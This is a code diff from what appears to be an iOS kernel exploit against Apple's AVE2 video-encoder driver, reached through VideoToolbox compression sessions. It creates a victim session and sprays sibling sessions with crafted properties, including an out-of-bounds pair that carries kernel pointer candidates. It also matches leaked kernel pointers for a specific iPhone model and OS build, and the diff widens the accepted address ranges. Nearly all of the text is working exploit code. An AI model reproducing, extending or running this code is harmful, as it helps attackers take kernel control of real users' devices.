@@ -200,7 +200,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         ntl = 16444; // 0xffffffed00000059 (AppleAVE2 outer-object band on iPhone16,1 27.0.1)
         for (int lk = 0; lk < liveKPtrCount; lk++) {
             uint32_t hi32 = (uint32_t)(liveKPtrs[lk] >> 32);
-            if (hi32 == 0xFFFFFFEDu || hi32 == 0xFFFFFFEFu || hi32 == 0xFFFFFFE2u) {
+            if ((hi32 >= 0xFFFFFFE0u && hi32 <= 0xFFFFFFEFu) ||
+                (hi32 >= 0xFFFFFE10u && hi32 <= 0xFFFFFE3Fu)) {
                 ntl = 16463 + (int32_t)hi32;
                 break;
             }
@@ -272,16 +273,17 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         CFNumberGetValue(vbn, kCFNumberIntType, &vrbPre);
         CFRelease(vbn);
     }
-    OSStatus vPrep = (ntl >= 16463) ? VTCompressionSessionPrepareToEncodeFrames(victim) : 0;
+    OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
     vbn = NULL;
     if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
         CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
         CFRelease(vbn);
     }
-    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d rt=%d privSet=%d set=%d pre=%d prep=%d post=%d",
-                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost]];
-    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d rt=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d\n",
-     (void *)victim, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost];
+    int seqSubLayersM1 = (vrbPost < 2 && ntl >= 2) ? (ntl - 1) : (vrbPost - 1);
+    [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d usage=%d rt=%d privSet=%d set=%d pre=%d prep=%d post=%d seqM1=%d",
+                   (void *)victim, ntl, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1]];
+    [report appendFormat:@"victim session created (%p) before spray: pm=%d usage=%d rt=%d privSet=%d NTL_set(%d)=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d)\n",
+     (void *)victim, (int)pmSt, (int)uSt, (int)rtSt, (int)privNSt, ntl, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1];
 
     // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
     //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
